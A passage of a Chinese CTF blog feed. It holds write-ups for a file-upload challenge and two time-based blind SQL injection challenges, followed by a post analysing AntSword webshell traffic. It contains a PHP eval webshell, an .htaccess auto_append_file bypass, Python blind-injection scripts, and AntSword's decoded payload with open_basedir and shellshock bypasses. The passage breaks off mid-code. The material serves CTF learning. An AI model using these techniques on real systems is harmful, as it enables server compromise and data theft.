funny_upload</span></h2><p>.htaccess的新姿势</p><p>文件上传的新姿势</p><hr><p>打开F12可以看到如下脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Checkfiles</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> fup = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fileName = fup.<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> ext = fileName.<span class="title function_">substring</span>(fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ext == <span class="string">&quot;gif&quot;</span> || ext == <span class="string">&quot;GIF&quot;</span> || ext == <span class="string">&quot;JPEG&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;JPG&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;这个文件不好，我不喜欢&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的= =</p><p>看看wp，要用php包含的方式连蚁剑，我也不知道为什么，挺神奇的</p><p>我们的.htaccess参数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script .jpg  <span class="comment">//采用php5-script处理器来解析匹配到的文件</span></span><br><span class="line">SetHandler application/x-httpd-php  <span class="comment">//将该目录和子目录所有文件映射为php类型（也就是当作PHP文件解析）</span></span><br><span class="line">AddType application/x-httpd-php .jpg <span class="comment">//将特定后缀文件映射为php类型</span></span><br></pre></td></tr></table></figure><p>.htaccess中使用auto_prepend_file与auto_append_file能在所有页面的顶部和底部require文件</p><p>php_value auto_prepend_file 在页面顶部加载文件</p><p>php_value auto_append_file 在页面底部加载文件</p><p>所以我们传入的.htaccess文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt  <span class="comment">//将.txt文件解析为php</span></span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span></span><br><span class="line"><span class="comment">//直接加载php://filter/convert.base64-decode/resource=1.txt（很熟悉吧，如果成功上传，就会在文件的底部加上1.txt base64解码的东西）</span></span><br></pre></td></tr></table></figure><p>然后传个1.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;  --&gt;base64 encode</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+</span><br></pre></td></tr></table></figure><p>蚁剑连接，找到flag</p><hr><h2><span id="really-easy-sql"> Really Easy SQL</span></h2><p>延时盲注（过滤sleep()，substr()）</p><hr><p>输入啥都没反应，由于又是SQL注入，很容易想到延时盲注</p><p>提示是insert注入</p><p>所以payload的格式有：<code>0' or payload or' </code></p><p>采用NewStarCTF的延时盲注脚本就可以了</p><p>但是这里直接使用会发现啥也没有，那肯定是过滤了字段</p><p>找了找writeup：</p><p>发现给了黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;updatexml&#x27;</span>,<span class="string">&#x27;order&#x27;</span>,<span class="string">&#x27;by&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;extractvalue&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;alter&#x27;</span>,<span class="string">&#x27;handler&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;offset&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;case&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;load&#x27;</span>);</span><br></pre></td></tr></table></figure><p>过滤sleep和substr</p><p>所以我们的payload修改下，mid能够替换substr，benchmark能替换sleep</p><p>benchmark：让数据库反复多次做一件事，增大延迟（比如执行2500000次的MD5加密）</p><span class="blur">这个benchmark的误差真的太大了，注意使用时按照延迟修改下keep>的参数</span><span class="blur">尤其是跑table和column的时候，那个误差，会输出全是~</span><p>同样使用二分脚本即可，payload编写方式与NewStarCTF 的延时盲注一致</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;http://8339f26b-3e1c-4fac-ab18-04b68c3e6279.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right =<span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.tables)where(table_name=&#x27;flaggg&#x27;)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">#这里使用管道符||替代or，但是黑名单是没有过滤or的，如果使用or的话需要多加一个括号</span></span><br><span class="line"></span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样的，睡一觉起来就能拿到flag了</p><p>先去睡会吧~</p><p>不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag</p><h2><span id="easysql"> EasySQL</span></h2><p>和上一题是一样的，但是过滤了大小于号…</p><p>那么我们就不能够用二分跑了，只能一个个遍历，我靠</p><p>用二分能够稍微提速，遍历那就是坐牢中的坐牢了（我手机点完外卖了都没跑完一个）</p><p>同样写脚本，只需要注意什么时候中断循环就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://b200590b-0cb2-40ff-9914-1837b3815604.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>,<span class="number">32</span>,-<span class="number">1</span>):</span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            res+=<span class="built_in">chr</span>(j)<span class="comment">#不是二分查询了，所以直接相等就行了</span></span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">#结束本次循环，进入下一次循环</span></span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">33</span>):<span class="comment">#中断循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样使用3000000次和1.8的keep，跑出来的结果是最精确的</p><p>当然也可以试试(32,127)，正向跑，<s>不知道正向跑和反向跑哪个快点呢= =</s></p><span class="blur">这是真的慢啊啊啊啊啊</span><p>跑了大概17、8分钟后，终于跑完了</p><hr><p>会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄</p><p>参考资料：</p><ul><li><a href="http://t.csdn.cn/zw08I">.htaccess文件解析漏洞</a></li><li><a href="http://t.csdn.cn/iK3P6">Dest0g3 520迎新赛 web部分 wp</a></li><li><a href="http://t.csdn.cn/rHjxY">PHP字符串函数hex2bin</a></li><li><a href="https://cn-sec.com/archives/83909.html">require_once 绕过</a></li></ul><p>还是开摆吧，呜呜</p><span class="blur">Orz</span>]]></content>
    
    
    <summary type="html">&lt;p&gt;你管这叫迎新赛…&lt;/p&gt;
&lt;p&gt;猛新啊，那没事了。&lt;/p&gt;
&lt;p&gt;只有自己不会做的世界达成了&lt;/p&gt;
&lt;p&gt;Misc的话… 之后再看看&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="SQL_Injection" scheme="http://example.com/tags/SQL-Injection/"/>
    
    <category term="POST" scheme="http://example.com/tags/POST/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
    <category term="Upload" scheme="http://example.com/tags/Upload/"/>
    
  </entry>
  
  <entry>
    <title>看看蚁剑流量包</title>
    <link href="http://example.com/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/"/>
    <id>http://example.com/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/</id>
    <published>2022-11-10T15:37:24.000Z</published>
    <updated>2023-03-12T09:43:56.845Z</updated>
    
    <content type="html"><![CDATA[<p>今天来看看Misc（雾）</p><p>只是简单的看一下蚁剑上传的包被wireshark抓包以后的形式</p><span id="more"></span><h2><span id="工具准备"> 工具准备</span></h2><p>Wireshark / Burp Suite （抓包工具，如果使用Burp需要在蚁剑设置代理）</p><p>中国蚁剑（AntSword）</p><p>以及测试靶机（使用校内靶机进行测试）</p><h2><span id="开始测试"> 开始测试</span></h2><p>1.使用txt文档写一个简单的一句话木马</p><p><code>&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</code></p><p>然后修改成1.php</p><p>2.随后上传至靶机，使用蚁剑连接。连接成功后打开虚拟终端</p><p>3.使用Wireshark监听数据，虚拟终端内输入whoami，将会获得如下图POST包</p><p>也可以输入其他命令（比如我输入的是cd /var/www/html/）</p><p>3.1 如果你使用的是Burp Suite，打开监听，设置蚁剑的代理为127.0.0.1:8080</p><p>然后重复3.的步骤</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/1.png" class title="无编码抓包"><p>可以将其复制出来，会发现仅有简单的urlencode，使用解码工具就能够得到以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">a=@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>)&#123;</span><br><span class="line">    <span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.1269377&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;357&quot;</span>.<span class="string">&quot;24f&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;45&quot;</span>.<span class="string">&quot;4cc&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;qf039f1d9cd528&quot;</span>],<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;g51c7aeb92ccb2&quot;</span>],<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h78f2db56e81bf&quot;</span>],<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;</span><br><span class="line">        <span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> 